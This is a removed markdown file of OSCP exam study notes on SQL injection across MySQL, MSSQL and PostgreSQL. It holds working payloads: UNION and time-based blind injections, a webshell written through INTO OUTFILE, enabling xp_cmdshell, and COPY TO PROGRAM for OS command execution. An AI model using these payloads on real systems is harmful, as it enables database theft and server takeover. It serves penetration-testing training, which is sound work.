@ -1,125 +0,0 @@
# Module 10 : SQL Injection

So the typical SQLi enumeration flow is:

1. Find what databases exist
2. Find what tables are in the target database
3. Find what columns are in the interesting table
4. Extract the actual data

---

## Module 10.1 SQL theory and databases:

---

### MySQL

```bash
#Connection 
kali@kali:~$ mysql -u root -p'<password>' -h <ip> -P 3306 --skip-ssl-verify-server-cert

#Show list for database
MySQL [(none)]> show databases;
+--------------------+
| Database           |
+--------------------+
| information_schema |
| mysql              |
| performance_schema |
| sys                |
| test               |
+--------------------+
5 rows in set (0.107 sec)
```

- information_schema : database about your database.

```sql
information_schema.tables
information_schema.columns
-- Comment: #  or --
-- List databases: SHOW DATABASES;
```

---


### MSSQL

```bash
#connection
kali@kali:~$ impacket-mssqlclient Administrator:Lab123@192.168.50.18 -windows-auth

#Show database
SQL (SQLPLAYGROUND\Administrator  dbo@master)> SELECT name FROM sys.databases;
name
...
master

tempdb

model

msdb

offsec

```

The database user depends on how the web app connects to MySQL. The connection credentials are set in the app's config file (like `config.php`). It could be:
- `root` — lazy developer, common in labs
- `webapp` — dedicated app user with limited privileges
- `admin` — somewhere in between

**How to check which database user you are:**

UNION-based:
```sql
' UNION SELECT user(),2,3,4,5,6--
```

Time-based blind:
```sql
' AND IF(SUBSTRING(user(),1,4)='root', SLEEP(5), 0)-- -
```

**For OSCP labs:**
Most lab machines use `root` as the database user because developers are lazy. But don't assume — always check first.

If you're not root, FILE privilege is unlikely and you'll need a different path to RCE.

### Key differences

```sql
information_schema.tables  -- works in MSSQL too
-- But also has its own:
sys.databases   -- list all databases
sys.tables      -- list tables in current database
sys.columns     -- list columns
-- Comment: --
-- Switch database: USE <dbname>
```

Key differences in MSSQL to remember:
- Comments use `--` not `#`
- String concatenation uses `+` not `CONCAT()`
- Has `xp_cmdshell` — a stored procedure that can **execute OS commands** directly from SQL. 

That's why MSSQL is particularly dangerous — if you get SQLi on MSSQL and `xp_cmdshell` is enabled, you can go straight from SQL injection to OS command execution.

---

## 10.2.2 UNION-based payloads

For UNION SQLi attacks to work, we first need to satisfy two conditions:

1. The injected UNION query has to include the same number of columns as the original query.
> Do `order by X` to find number of columns 

2. The data types need to be compatible between each column.
> For starts, put all int, if it does not work do NULL types for all the columns. Eg. UNION SELECT NULL,NULL,NULL,NULL,NULL;


### RCE with MySQL

In MySQL, file privilege allows you to read and write files on the server.

The classic path to RCE is:

**Write a PHP webshell to the web root:**
```sql
mail-list=notexist' UNION SELECT 1,2,3,4,"<?php echo system($_GET['cmd']); ?>",6 INTO OUTFILE '/var/www/html/shell.php'#
```

This writes your PHP webshell directly to the web server's document root.

Then access it at:
```
http://<target_ip>/shell.php?cmd=id
```

Two conditions needed:

1. **MySQL has write permission to the web root** — the MySQL process needs filesystem permission to write to `/var/www/html/`. This isn't always the case — sometimes MySQL runs as a restricted user.

2. **The web server executes PHP** — the file you write needs to be in a location the web server serves AND the server must execute PHP files. If it's nginx without PHP-FPM configured, it won't execute `.php` files.

You already know nginx is running from your earlier enumeration. Nginx doesn't execute PHP natively — it needs PHP-FPM configured alongside it.

---

## RCE with MSSQL — `xp_cmdshell`:**
- Need `sa` or sysadmin privileges
```sql
'; IF (SELECT IS_SRVROLEMEMBER('sysadmin'))=1 WAITFOR DELAY '0:0:5' -- checks for sysadmin privileges (blindsql)
```

- `xp_cmdshell` may need to be enabled first:
```sql
EXECUTE sp_configure 'show advanced options', 1;
RECONFIGURE;
EXECUTE sp_configure 'xp_cmdshell', 1;
RECONFIGURE;
```
- Then execute OS commands:
```sql
EXECUTE xp_cmdshell 'whoami';
```

---

## PostgreSQL — `COPY TO/FROM PROGRAM`:**
- Need superuser privileges
- Uses the COPY statement to pipe data through an OS command:
```sql
COPY (SELECT '') TO PROGRAM 'command_here';
```
- Or create a function:
```sql
CREATE OR REPLACE FUNCTION system(cstring) RETURNS int AS '/lib/x86_64-linux-gnu/libc.so.6','system' LANGUAGE 'c' STRICT;
SELECT system('whoami');
```

**Key condition for both:** you need elevated database privileges. For OSCP labs these are usually pre-configured to be vulnerable.

---

## Blind SQL (time-based execution)


**MySQL**
```sql
' AND SLEEP(5)-- -
' AND IF(1=1, SLEEP(5), 0)-- -

' AND IF((SELECT super_priv FROM mysql.user WHERE user='root')='Y', SLEEP(5), 0)-- -
```


**MSSQL**
```sql
WAITFOR DELAY ‘0:0:5’ -- pause for 5 seconds

'; IF (SELECT IS_SRVROLEMEMBER('sysadmin'))=1 WAITFOR DELAY '0:0:5' -- checks for sysadmin privileges (blindsql)
```


**PostgreSQL**
```sql
SELECT pg_sleep(10); — postgres 8.2+ only

' AND (SELECT CASE WHEN (SELECT current_setting('is_superuser'))='on' THEN pg_sleep(5) ELSE pg_sleep(0) END)--
```


On OSCP, just try it:

- MySQL → attempt `INTO OUTFILE` directly
- MSSQL → attempt enabling `xp_cmdshell` directly
- PostgreSQL → attempt `COPY TO PROGRAM` directly

If it works, you're in. If it errors with permission denied, move on to other attack vectors. Don't waste exam time checking privileges before attempting the exploit.

Back to the quiz?